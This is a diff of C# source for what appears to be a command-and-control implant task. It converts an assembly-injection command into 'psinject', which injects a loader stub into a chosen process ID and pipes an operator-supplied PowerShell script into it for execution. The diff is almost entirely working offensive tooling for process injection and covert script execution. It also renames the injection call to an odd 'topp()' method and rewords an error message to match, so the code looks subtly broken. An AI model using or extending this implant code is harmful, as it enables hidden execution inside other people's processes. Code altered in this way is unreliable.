@@ -1,10 +1,11 @@
 ﻿#define COMMAND_NAME_UPPER
 
 #if DEBUG
-#define ASSEMBLY_INJECT
+#define PSINJECT
 #endif
 
-#if ASSEMBLY_INJECT
+#if PSINJECT
+
 using System;
 using System.Linq;
 using System.Text;
@@ -21,23 +22,19 @@ using Interop.Classes.Collections;
 
 namespace Tasks
 {
-    public class assembly_inject : Tasking
+    public class psinject : Tasking
     {
         [DataContract]
-        internal struct AssemblyInjectParameters
+        internal struct PowerShellInjectParameters
         {
             [DataMember(Name = "pipe_name")]
             public string PipeName;
-            [DataMember(Name = "assembly_name")]
-            public string AssemblyName;
-            [DataMember(Name = "assembly_id")]
-            public string AssemblyId;
-            [DataMember(Name = "assembly_arguments")]
-            public string AssemblyArguments;
             [DataMember(Name = "loader_stub_id")]
             public string LoaderStubId;
             [DataMember(Name = "pid")]
             public int PID;
+            [DataMember(Name = "powershell_params")]
+            public string PowerShellParameters;
         }
 
         private AutoResetEvent _senderEvent = new AutoResetEvent(false);
@@ -49,7 +46,7 @@ namespace Tasks
         private Action<object> _flushMessages;
         private ThreadSafeList<string> _assemblyOutput = new ThreadSafeList<string>();
         private bool _completed = false;
-        public assembly_inject(IAgent agent, MythicTask mythicTask) : base(agent, mythicTask)
+        public psinject(IAgent agent, MythicTask mythicTask) : base(agent, mythicTask)
         {
             _sendAction = (object p) =>
             {
@@ -100,16 +97,15 @@ namespace Tasks
                 }
             };
         }
-
-
+        
         public override void Start()
         {
             MythicTaskResponse resp;
             try
             {
-                AssemblyInjectParameters parameters = _jsonSerializer.Deserialize<AssemblyInjectParameters>(_data.Parameters);
+                PowerShellInjectParameters parameters = _jsonSerializer.Deserialize<PowerShellInjectParameters>(_data.Parameters);
                 if (string.IsNullOrEmpty(parameters.LoaderStubId) ||
-                    string.IsNullOrEmpty(parameters.AssemblyName) ||
+                    string.IsNullOrEmpty(parameters.PowerShellParameters) ||
                     string.IsNullOrEmpty(parameters.PipeName))
                 {
                     resp = CreateTaskResponse(
@@ -132,24 +128,11 @@ namespace Tasks
 
                     if (pidRunning)
                     {
-                        byte[] assemblyBytes;
-                        if(!_agent.GetFileManager().GetFileFromStore(parameters.AssemblyName, out assemblyBytes))
-                        {
-                            if(!_agent.GetFileManager().GetFile(_cancellationToken.Token, _data.ID, parameters.AssemblyId, out assemblyBytes))
-                            {
-                                resp = CreateTaskResponse($"Failed to fetch {parameters.AssemblyName} from Mythic", true);
-                                _agent.GetTaskManager().AddTaskResponseToQueue(resp);
-                                return;
-                            } else
-                            {
-                                _agent.GetFileManager().AddFileToStore(parameters.AssemblyName, assemblyBytes);
-                            }
-                        }
                         if (_agent.GetFileManager().GetFile(_cancellationToken.Token, _data.ID, parameters.LoaderStubId,
                                 out byte[] exeAsmPic))
                         {
                             var injector = _agent.GetInjectionManager().CreateInstance(exeAsmPic, parameters.PID);
-                            if (injector.Inject())
+                            if (injector.topp())
                             {
                                 _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse(
                                     "",
@@ -160,18 +143,24 @@ namespace Tasks
                                         Artifact.ProcessInject(parameters.PID,
                                             _agent.GetInjectionManager().GetCurrentTechnique().Name)
                                     }));
+                                string cmd = "";
+                                string loadedScript = _agent.GetFileManager().GetScript();
+                                if (!string.IsNullOrEmpty(loadedScript))
+                                {
+                                    cmd += loadedScript;
+                                }
+
+                                cmd += "\n\n" + parameters.PowerShellParameters;
                                 IPCCommandArguments cmdargs = new IPCCommandArguments
                                 {
-                                    ByteData = assemblyBytes,
-                                    StringData = string.IsNullOrEmpty(parameters.AssemblyArguments)
-                                        ? ""
-                                        : parameters.AssemblyArguments,
+                                    ByteData = new byte[0],
+                                    StringData = cmd
                                 };
                                 AsyncNamedPipeClient client = new AsyncNamedPipeClient("127.0.0.1", parameters.PipeName);
                                 client.ConnectionEstablished += Client_ConnectionEstablished;
                                 client.MessageReceived += Client_MessageReceived;
                                 client.Disconnect += Client_Disconnect;
-                                if (client.Connect(10000))
+                                if (client.Connect(3000))
                                 {
                                     IPCChunkedData[] chunks = _serializer.SerializeIPCMessage(cmdargs);
                                     foreach (IPCChunkedData chunk in chunks)
@@ -191,7 +180,7 @@ namespace Tasks
                             }
                             else
                             {
-                                resp = CreateTaskResponse($"Failed to inject into PID {parameters.PID}", true, "error");
+                                resp = CreateTaskResponse($"Failed to topp into PID {parameters.PID}", true, "error");
                             }
                         }
                         else
